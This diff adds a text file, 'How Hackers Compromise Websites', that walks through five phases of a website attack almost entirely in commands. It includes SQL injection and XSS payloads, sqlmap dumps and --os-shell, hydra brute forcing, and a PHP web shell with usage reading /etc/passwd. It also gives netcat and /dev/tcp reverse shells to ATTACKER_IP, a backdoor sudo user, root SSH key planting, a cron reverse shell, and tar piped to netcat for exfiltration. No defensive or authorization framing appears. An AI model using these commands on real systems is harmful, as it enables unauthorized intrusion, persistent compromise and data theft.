@@ -1,0 +1,272 @@
+How Hackers Compromise Websites
+
+The Hacker Methodology: Five Core Phases
+
+Reconnaissance (Information Gathering)
+
+Scanning & Enumeration
+
+Vulnerability Assessment
+
+Exploitation
+
+Post-Exploitation & Persistence
+
+Each phase builds on the previous one, following a structured and methodical approach.
+
+
+
+PHASE 1: ReconnaISSANCE (Information Gathering)
+
+Objective: Collect as much information as possible about the target without triggering alerts.
+
+A. Passive Reconnaissance (No Direct Interaction)
+
+1. WHOIS Lookup
+
+whois example.com 
+
+Information obtained:
+
+Domain registrar
+
+Registration and expiration dates
+
+Name servers
+
+Registrant contact information
+
+
+
+2. DNS Enumeration
+
+dig example.com ANY dig example.com AXFR dig example.com MX dig example.com NS 
+
+Used to identify DNS records, subdomains, mail servers, and name servers.
+
+
+
+3. Google Dorking (Advanced Search Queries)
+
+site:example.com filetype:pdf site:example.com inurl:admin site:example.com intext:"password" site:example.com ext:sql site:example.com intitle:"index of" site:example.com inurl:login 
+
+Helps locate exposed files, login pages, and sensitive information indexed by search engines.
+
+
+
+4. Subdomain Enumeration
+
+sublist3r -d example.com amass enum -d example.com 
+
+Web-based alternative:
+
+https://dnsdumpster.com
+
+
+
+5. Technology Detection
+
+whatweb example.com 
+
+Other tools:
+
+Wappalyzer
+
+BuiltWith (https://builtwith.com)
+
+Identifies web server, frameworks, CMS, and backend technologies.
+
+
+
+6. Wayback Machine
+
+https://web.archive.org
+
+Used to review historical versions of the website and uncover removed or forgotten pages.
+
+
+
+7. Social Media & Employee Information
+
+Sources include:
+
+LinkedIn
+
+GitHub
+
+Pastebin
+
+Automated tool:
+
+theHarvester -d example.com -b all 
+
+
+
+PHASE 2: SCANNING & ENUMERATION
+
+Objective: Identify live hosts, open ports, and running services.
+
+
+
+A. Network Scanning
+
+1. Ping Sweep
+
+ping -c 4 example.com nmap -sn 192.168.1.0/24 
+
+
+
+2. Port Scanning with Nmap
+
+nmap example.com nmap -p- example.com nmap -sV example.com nmap -O example.com nmap -A example.com nmap -p 80,443,22,21,3306 example.com sudo nmap -sS example.com sudo nmap -sU example.com 
+
+
+
+3. Service Enumeration
+
+HTTP/HTTPS
+
+curl -I http://example.com nmap --script http-methods example.com dirb http://example.com gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt 
+
+SSH
+
+nmap --script ssh-auth-methods example.com 
+
+FTP
+
+nmap --script ftp-anon example.com 
+
+MySQL
+
+nmap --script mysql-info example.com 
+
+
+
+B. Web Application Scanning
+
+1. Directory & File Enumeration
+
+gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dirb http://example.com ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt python3 dirsearch.py -u http://example.com 
+
+Common discoveries:
+
+/admin
+
+/login
+
+/phpmyadmin
+
+/backup
+
+/config
+
+/uploads
+
+/api
+
+
+
+2. Web Vulnerability Scanning
+
+nikto -h http://example.com wpscan --url http://example.com --enumerate u,p,t nuclei -u http://example.com 
+
+
+
+PHASE 3: VULNERABILITY ASSESSMENT
+
+Objective: Identify exploitable weaknesses.
+
+
+
+A. Manual Testing
+
+1. SQL Injection Testing
+
+http://example.com/product.php?id=1' http://example.com/product.php?id=1' UNION SELECT NULL,NULL,NULL-- http://example.com/product.php?id=1' AND SLEEP(5)-- 
+
+Using SQLmap:
+
+sqlmap -u "http://example.com/product.php?id=1" --dbs sqlmap -u "http://example.com/product.php?id=1" -D database_name --tables sqlmap -u "http://example.com/product.php?id=1" -D database_name -T users --dump 
+
+
+
+2. Cross-Site Scripting (XSS)
+
+<script>alert('XSS')</script> <img src=x onerror=alert('XSS')> <svg onload=alert('XSS')> 
+
+
+
+3. File Upload Vulnerabilities
+
+<?php system($_GET['cmd']); ?> 
+
+Bypass techniques:
+
+shell.php.jpg
+
+shell.php%00.jpg
+
+shell.phtml
+
+shell.php5
+
+
+
+4. Authentication Bypass
+
+Default credentials:
+
+admin:admin admin:password root:root 
+
+SQL injection login:
+
+Username: admin' OR '1'='1 Password: anything 
+
+Brute force:
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" 
+
+
+
+PHASE 4: EXPLOITATION
+
+Objective: Gain unauthorized access.
+
+
+
+A. SQL Injection Exploitation
+
+sqlmap -u "http://example.com/product.php?id=1" --batch sqlmap -u "http://example.com/product.php?id=1" --dbs --batch sqlmap -u "http://example.com/product.php?id=1" -D shop_db --tables --batch sqlmap -u "http://example.com/product.php?id=1" -D shop_db -T users --dump --batch sqlmap -u "http://example.com/product.php?id=1" --os-shell 
+
+
+
+B. File Upload Exploitation
+
+Web shell:
+
+<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> 
+
+Usage:
+http://example.com/uploads/shell.php?cmd=whoami http://example.com/uploads/shell.php?cmd=ls -la http://example.com/uploads/shell.php?cmd=cat /etc/passwd 
+
+Reverse shell:
+nc -lvnp 4444 nc -e /bin/bash ATTACKER_IP 4444 
+
+C. Known Vulnerabilities (Metasploit)
+msfconsole search wordpress use exploit/unix/webapp/wp_admin_shell_upload set RHOSTS example.com set TARGETURI /wordpress set USERNAME admin set PASSWORD password123 exploit 
+
+PHASE 5: POST-EXPLOITATION
+Objective: Maintain access and extract data.
+
+A. Privilege Escalation
+whoami id sudo -l find / -perm -4000 2>/dev/null uname -a searchsploit linux kernel 4.4.0 
+
+B. Maintaining Access
+useradd -m -s /bin/bash hacker echo "hacker:password123" | chpasswd usermod -aG sudo hacker mkdir /root/.ssh echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /var/spool/cron/crontabs/root 
+
+C. Data Exfiltration
+find / -name "*.conf" 2>/dev/null find / -name "config.php" 2>/dev/null find / -name "*.sql" 2>/dev/null mysqldump -u root -p database_name > dump.sql nc -lvnp 5555 > stolen_data.tar.gz tar -czf - /var/www/html | nc ATTACKER_IP 5555 
+
+
+
+
